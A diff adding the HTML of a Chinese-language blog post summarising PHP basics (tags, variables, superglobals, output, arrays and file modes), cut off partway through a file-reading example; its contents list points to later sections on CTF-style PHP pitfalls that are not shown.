@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">PHP知识小结 - 高诺琪&#39;s Blog</title><meta name="Description" content="宁静致远"><meta property="og:title" content="PHP知识小结" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://KohN0q1.github.io/php%E5%9F%BA%E7%A1%80/" /><meta property="og:image" content="https://KohN0q1.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-10-13T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-10-13T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://KohN0q1.github.io/logo.png"/>
+
+<meta name="twitter:title" content="PHP知识小结"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="https://KohN0q1.github.io/php%E5%9F%BA%E7%A1%80/" /><link rel="prev" href="https://KohN0q1.github.io/%E5%8F%8D%E5%BC%B9shell/" /><link rel="next" href="https://KohN0q1.github.io/pwnenvironment/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PHP知识小结",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/KohN0q1.github.io\/php%E5%9F%BA%E7%A1%80\/"
+        },"genre": "posts","wordcount":  4046 ,
+        "url": "https:\/\/KohN0q1.github.io\/php%E5%9F%BA%E7%A1%80\/","datePublished": "2020-10-13T00:00:00+00:00","dateModified": "2020-10-13T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "高诺琪"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="auto" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="高诺琪&#39;s Blog">高诺琪&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friend/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="高诺琪&#39;s Blog">高诺琪&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friend/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础知识">基础知识</a>
+      <ul>
+        <li><a href="#php标签">PHP标签</a></li>
+        <li><a href="#变量">变量</a></li>
+        <li><a href="#超全局变量">超全局变量</a></li>
+        <li><a href="#输出语句">输出语句</a></li>
+        <li><a href="#数组">数组</a></li>
+        <li><a href="#文件操作">文件操作</a></li>
+      </ul>
+    </li>
+    <li><a href="#常见函数">常见函数</a>
+      <ul>
+        <li><a href="#strcmp-和-strcasecmp">strcmp 和 strcasecmp</a></li>
+        <li><a href="#md5">md5</a></li>
+        <li><a href="#intval">intval</a></li>
+        <li><a href="#is_numeric">is_numeric</a></li>
+        <li><a href="#in_array">in_array</a></li>
+        <li><a href="#变量覆盖">变量覆盖</a>
+          <ul>
+            <li><a href="#extract">extract</a></li>
+            <li><a href="#parse_str">parse_str</a></li>
+            <li><a href="#import_request_variables">import_request_variables</a></li>
+            <li><a href="#变量覆盖-1">$$变量覆盖</a></li>
+            <li><a href="#全局变量覆盖">全局变量覆盖</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#版本区别">版本区别</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#preg_replace不再支持e修饰符">preg_replace()不再支持/e修饰符</a></li>
+            <li><a href="#create_function被废弃">create_function被废弃</a></li>
+            <li><a href="#mysql_系列全员移除">mysql_*系列全员移除</a></li>
+            <li><a href="#assert默认不在可以执行代码">assert()默认不在可以执行代码</a></li>
+            <li><a href="#十六进制字符串不再被认为是数字">十六进制字符串不再被认为是数字</a></li>
+            <li><a href="#移除了-asp-和-script-php-标签">移除了 ASP 和 script PHP 标签</a></li>
+            <li><a href="#超大浮点数类型转换截断">超大浮点数类型转换截断</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PHP知识小结</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">高诺琪</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/php/"><i class="far fa-folder fa-fw"></i>PHP</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-10-13">2020-10-13</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-10-13">2020-10-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4046 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 9 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础知识">基础知识</a>
+      <ul>
+        <li><a href="#php标签">PHP标签</a></li>
+        <li><a href="#变量">变量</a></li>
+        <li><a href="#超全局变量">超全局变量</a></li>
+        <li><a href="#输出语句">输出语句</a></li>
+        <li><a href="#数组">数组</a></li>
+        <li><a href="#文件操作">文件操作</a></li>
+      </ul>
+    </li>
+    <li><a href="#常见函数">常见函数</a>
+      <ul>
+        <li><a href="#strcmp-和-strcasecmp">strcmp 和 strcasecmp</a></li>
+        <li><a href="#md5">md5</a></li>
+        <li><a href="#intval">intval</a></li>
+        <li><a href="#is_numeric">is_numeric</a></li>
+        <li><a href="#in_array">in_array</a></li>
+        <li><a href="#变量覆盖">变量覆盖</a>
+          <ul>
+            <li><a href="#extract">extract</a></li>
+            <li><a href="#parse_str">parse_str</a></li>
+            <li><a href="#import_request_variables">import_request_variables</a></li>
+            <li><a href="#变量覆盖-1">$$变量覆盖</a></li>
+            <li><a href="#全局变量覆盖">全局变量覆盖</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#版本区别">版本区别</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#preg_replace不再支持e修饰符">preg_replace()不再支持/e修饰符</a></li>
+            <li><a href="#create_function被废弃">create_function被废弃</a></li>
+            <li><a href="#mysql_系列全员移除">mysql_*系列全员移除</a></li>
+            <li><a href="#assert默认不在可以执行代码">assert()默认不在可以执行代码</a></li>
+            <li><a href="#十六进制字符串不再被认为是数字">十六进制字符串不再被认为是数字</a></li>
+            <li><a href="#移除了-asp-和-script-php-标签">移除了 ASP 和 script PHP 标签</a></li>
+            <li><a href="#超大浮点数类型转换截断">超大浮点数类型转换截断</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="基础知识" class="headerLink">
+    <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="header-mark"></a>基础知识</h2><h3 id="php标签" class="headerLink">
+    <a href="#php%e6%a0%87%e7%ad%be" class="header-mark"></a>PHP标签</h3><ul>
+<li><code>&lt;?php 标准风格标记，属于XML风格；?&gt;</code></li>
+<li><code>&lt;script lanauage=&quot;php&quot;&gt;长风格标记&lt;/script&gt;</code></li>
+<li><code>&lt;? 短风格的标记 ?&gt;</code>      需要在php.ini中short_open_tag设置</li>
+<li><code>&lt;% ASP风格的标记 %&gt;</code>     需要在php.ini中asp_tags设置</li>
+<li><code>&lt;?=</code>       同等于&lt;? echo，适用版本&gt;PHP 5.4.0</li>
+</ul>
+<p>PHP 中的每个代码行都必须以分号(<code>;</code>)结束
+错误运算符 <code>@</code>，当将其放在一个PHP表达式之前，该表达式可能产生的任何错误信息都被忽略掉</p>
+</br>
+<h3 id="变量" class="headerLink">
+    <a href="#%e5%8f%98%e9%87%8f" class="header-mark"></a>变量</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">简单数据类型：</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">Boolean 布尔型</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">string 字符串型</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">integer 整型</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">float 浮点型</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">复合数据类型：</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="k">array</span> <span class="nx">数组</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">object</span> <span class="nx">对象</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">两种特殊类型</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">resource</span> <span class="nx">资源</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="k">NULL</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>检测变量类型：</p>
+<ul>
+<li><code>is_bool()</code> 是否为布尔型</li>
+<li><code>is_int(),is_integer(),is_long()</code> 是否为整型</li>
+<li><code>is_float(),is_double(),is_real()</code> 是否为浮点型</li>
+<li><code>is_string()</code> 是否为字符串</li>
+<li><code>is_array()</code> 是否为数组</li>
+<li><code>is_object()</code> 是否为对象</li>
+<li><code>is_resource()</code> 是否为资源类型</li>
+<li><code>is_null()</code> 是否为空</li>
+<li><code>is_scalar()</code> 是否是标量，也就是是否为整数、浮点数、布尔型或字符串。</li>
+<li><code>is_numeric()</code> 是否是任何类型的数字或数字字符串</li>
+<li><code>is_callable()</code> 判断是否是有效的函数名</li>
+</ul>
+<br/>
+<p>可变变量是一种PHP独特的变量，利用一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;hello&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$$a</span><span class="o">=</span><span class="s1">&#39;wrold&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">以下均输出</span> <span class="nx">world</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">${$a}</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$hello</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>PHP中常用魔术常量：</p>
+<ul>
+<li><code>__FILE__</code>    当前的文件名</li>
+<li><code>__LINE__</code>   当前的行数</li>
+<li><code>__FUNCTION__</code>   当前的函数名</li>
+<li><code>__CLASS__</code>   当前的类名</li>
+<li><code>__METHOD__</code>  当前对象的方法名</li>
+</ul>
+<br/>
+<p>变量作用域：</p>
+<ul>
+<li>局部变量：在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问</li>
+<li>全局变量：在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</li>
+<li>静态变量：使用<code>static</code>关键字声明变量，能够在函数调用结束后仍保留变量值，当再次回到其作用域时，又可以继续使用原来的值</li>
+</ul>
+<br/>
+<p>常量使用<code>define</code>函数来定义，不能通过赋值，例如<code>&lt;?php define('pi','3.14');echo pi?&gt;</code>，常量一旦定义就不能被重新定义或者取消定义，直到脚本运行结束自动释放，且不受变量范围影响，在任何地方都可以定义和访问</p>
+<br/>
+<h3 id="超全局变量" class="headerLink">
+    <a href="#%e8%b6%85%e5%85%a8%e5%b1%80%e5%8f%98%e9%87%8f" class="header-mark"></a>超全局变量</h3><p>超全局变量在 PHP 4.1.0 中引入，是在全部作用域中始终可用的内置变量。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$GLOBALS</span>  <span class="nx">引用全局作用域中可用的全部变量</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_POST</span>  <span class="nx">获取POST数据</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_GET</span>  <span class="nx">获取GET数据</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_COOKIE</span>  <span class="nx">获取COOKIE信息</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span>  <span class="nx">获取SESSION信息</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_FILES</span>  <span class="nx">获取上传的文件信息</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_REQUEST</span>  <span class="nx">用于收集</span> <span class="nx">HTML</span> <span class="nx">表单提交的数据</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_ENV</span>  <span class="nx">环境变量</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SERVER</span>  <span class="nx">服务器和执行环境信息</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br/>
+<h3 id="输出语句" class="headerLink">
+    <a href="#%e8%be%93%e5%87%ba%e8%af%ad%e5%8f%a5" class="header-mark"></a>输出语句</h3><ul>
+<li><code>echo</code> 最常见的PHP输出语句，例如：<code>&lt;?php echo &quot;hello&quot;; ?&gt;</code></li>
+<li><code>print()</code>存在返回值，输出成功返回1，失败返回0，例如：<code>&lt;?php print(&quot;hello&quot;)?&gt;</code></li>
+<li><code>printf</code> 格式化输出字符串，例如：<code>&lt;?php printf(&quot;%d,%.2f&quot;,1,1.2); ?&gt;</code></li>
+<li><code>print_r()</code> 打印字符，字符串，数字，数组，对象等复合的数据类型，例如：<code>&lt;?php print_r('hello'); ?&gt;</code></li>
+<li><code>var_dump()</code> 在print_r基础上加上数据的类型和长度，例如：<code>&lt;?php var_dump('hello'); ?&gt;</code></li>
+</ul>
+<br/>
+<p>双引号可以解析变量，单引号不能解析变量，字符串之间用<code>.</code>来连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;hello&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="s2">&#34;world&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$a</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;</span><span class="si">$b</span><span class="s2">&#34;</span><span class="p">;</span> <span class="nx">输出helloworld</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;$a&#39;</span><span class="o">.</span><span class="s1">&#39;$b&#39;</span><span class="p">;</span> <span class="nx">输出</span><span class="nv">$a$b</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><br/>
+<h3 id="数组" class="headerLink">
+    <a href="#%e6%95%b0%e7%bb%84" class="header-mark"></a>数组</h3><p>创建数组</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arr</span><span class="o">=</span><span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;root&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;password&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;root123&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;root&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arr</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;root123&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>遍历数组</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//遍历数值数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$fruits</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;apple&#34;</span><span class="p">,</span><span class="s2">&#34;banana&#34;</span><span class="p">,</span><span class="s2">&#34;peach&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arrlength</span><span class="o">=</span><span class="nx">count</span><span class="p">(</span><span class="nv">$fruits</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$x</span><span class="o">&lt;</span><span class="nv">$arrlength</span><span class="p">;</span><span class="nv">$x</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$fruits</span><span class="p">[</span><span class="nv">$x</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">//遍历关联数组
+</span></span></span><span class="line"><span class="cl"><span class="err">$age=array(&#34;zs&#34;=&gt;&#34;12&#34;,&#34;ls&#34;=&gt;&#34;15&#34;,&#34;ww&#34;=&gt;&#34;18&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">foreach($age as $x=&gt;$x_value)
+</span></span></span><span class="line"><span class="cl"><span class="err">{
+</span></span></span><span class="line"><span class="cl"><span class="err">    echo &#34;Key=&#34; . $x . &#34;, Value=&#34; . $x_value;
+</span></span></span><span class="line"><span class="cl"><span class="err">    echo &#34;&lt;br&gt;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>数组排序</p>
+<ul>
+<li><code>sort()</code>  对数组进行升序排列</li>
+<li><code>rsort()</code> 对数组进行降序排列</li>
+<li><code>asort()</code> 根据关联数组的值，对数组进行升序排列</li>
+<li><code>ksort()</code> 根据关联数组的键，对数组进行升序排列</li>
+<li><code>arsort()</code>根据关联数组的值，对数组进行降序排列</li>
+<li><code>krsort()</code>根据关联数组的键，对数组进行降序排列</li>
+</ul>
+<br/>
+<h3 id="文件操作" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e6%93%8d%e4%bd%9c" class="header-mark"></a>文件操作</h3><p><code>fopen($fname, mode)</code>函数用于在 PHP 中打开文件，第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件。</p>
+<ul>
+<li><code>r</code> 只读。在文件的开头开始。</li>
+<li><code>r+</code> 读/写。在文件的开头开始。</li>
+<li><code>w</code> 只写。打开并清空文件的内容；如果文件不存在，则创建新文件。</li>
+<li><code>w+</code> 读/写。打开并清空文件的内容；如果文件不存在，则创建新文件。</li>
+<li><code>a</code> 追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。</li>
+<li><code>a+</code> 读/追加。通过向文件末尾写内容，来保持文件内容。</li>
+<li><code>x</code> 只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</li>
+<li><code>x+</code> 读/写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</li>
+</ul>
+<p>注释：如果 fopen() 函数无法打开指定文件，则返回 0 (false)。</p>
+<p>读取文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//读取文件每一行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;无法打开文件!&#34;</span><span class="p">);</span>
